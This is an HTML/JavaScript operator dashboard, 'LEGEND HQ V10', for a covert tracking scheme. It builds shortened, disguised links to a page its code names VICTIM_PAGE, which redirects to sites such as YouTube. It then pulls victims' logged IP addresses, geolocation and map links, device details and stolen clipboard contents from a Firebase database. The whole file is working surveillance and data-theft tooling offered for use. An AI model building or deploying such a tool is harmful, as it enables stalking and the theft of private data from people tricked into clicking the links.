<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MA LEGEND | HQ V10 WHITE</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Poppins:wght@400;600&display=swap');
        body { background: #e0e5ec; font-family: 'Poppins', sans-serif; color: #44476a; padding: 15px; display: flex; justify-content: center; }
        .container { width: 100%; max-width: 800px; }
        .neu-card { background: #e0e5ec; padding: 25px; border-radius: 30px; box-shadow: 9px 9px 16px #bcbfc5, -9px -9px 16px #ffffff; margin-bottom: 25px; }
        h2 { font-family: 'Orbitron'; color: #00a884; text-align: center; font-size: 1.2rem; }
        input { width: 100%; padding: 12px; border: none; border-radius: 12px; background: #e0e5ec; box-shadow: inset 4px 4px 8px #cbcbe1, inset -4px -4px 8px #ffffff; outline: none; margin: 8px 0; box-sizing: border-box; }
        .btn { width: 100%; padding: 14px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; color: #00a884; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; margin-top: 10px; transition: 0.3s; }
        .btn:active { box-shadow: inset 3px 3px 6px #bcbfc5, inset -3px -3px 6px #ffffff; }
        .log-card { background: #e0e5ec; padding: 15px; border-radius: 20px; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; margin-top: 15px; border-left: 6px solid #00a884; font-size: 0.8rem; }
        .badge { background: #d1d9e6; padding: 3px 8px; border-radius: 5px; display: inline-block; margin: 2px; font-weight: 600; color: #00a884; }
        .copy-box { display: flex; gap: 10px; display: none; margin-top: 10px; }
        pre { background: #1a1a1a; color: #00ffaa; padding: 10px; border-radius: 10px; overflow-x: auto; white-space: pre-wrap; font-size: 0.75rem; }
    </style>
</head>
<body>
    <div class="container">
        <div class="neu-card">
            <h2>LEGEND HQ V10</h2>
            <input type="text" id="masterKey" placeholder="Secret Key">
            <input type="text" id="targetUrl" placeholder="Target URL (e.g. YouTube)">
            <button class="btn" onclick="generateLink()" style="background: #00a884; color: white;">GENERATE LINK</button>
            <div id="resArea" class="copy-box">
                <input type="text" id="finalLink" readonly style="color:#00a884;">
                <button class="btn" style="width:auto; margin:0; padding:10px 20px;" onclick="copyLink()">COPY</button>
            </div>
        </div>

        <div style="display:flex; gap:10px;">
            <button class="btn" style="flex:1" onclick="fetchLogs('tracking')">LOCATIONS</button>
            <button class="btn" style="flex:1" onclick="fetchLogs('clipboard')">CLIPBOARD</button>
        </div>
        <div id="displayArea"></div>
    </div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
        const VICTIM_PAGE = "https://video-obtg.vercel.app/";

        async function generateLink() {
            const key = document.getElementById('masterKey').value.trim();
            const url = document.getElementById('targetUrl').value.trim();
            if(!key || !url) return alert("Fields fill karein!");
            const payload = btoa(JSON.stringify({ k: key, r: url }));
            const longLink = `${VICTIM_PAGE}?id=${payload}`;
            try {
                const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longLink)}`);
                document.getElementById('finalLink').value = await res.text();
            } catch(e) { document.getElementById('finalLink').value = longLink; }
            document.getElementById('resArea').style.display = 'flex';
        }

        function copyLink() {
            const el = document.getElementById("finalLink"); el.select(); document.execCommand("copy"); alert("Copied!");
        }

        async function fetchLogs(path) {
            const key = document.getElementById('masterKey').value.trim();
            const res = await fetch(`${DB_URL}${path}/${key}.json`);
            const data = await res.json();
            const area = document.getElementById('displayArea');
            area.innerHTML = `<h3>${path.toUpperCase()} LOGS</h3>`;
            if(!data) return area.innerHTML += "<p>No data found.</p>";
            Object.keys(data).reverse().forEach(id => {
                const item = data[id];
                area.innerHTML += `<div class="log-card">
                    <b>üïí ${item.time}</b><br>
                    ${item.ip ? `
                        <span class="badge">üåê IP: ${item.ip}</span> <span class="badge">üìç ${item.loc}</span><br>
                        <span class="badge">üîã Battery: ${item.battery}%</span> <span class="badge">üß† RAM: ${item.ram}GB</span><br>
                        <span class="badge">üì∂ Net: ${item.netType} (${item.speed} Mbps)</span><br>
                        <span class="badge">üñ•Ô∏è ${item.res}</span> <span class="badge">üìê ${item.orient}</span><br>
                        <a href="${item.map}" target="_blank" style="color:#00a884; font-weight:bold; display:block; margin-top:5px;">[ OPEN MAP ]</a>
                    ` : ''}
                    ${item.clipData ? `<pre>${item.clipData}</pre>` : ''}
                </div>`;
            });
        }
    </script>
</body>
</html>
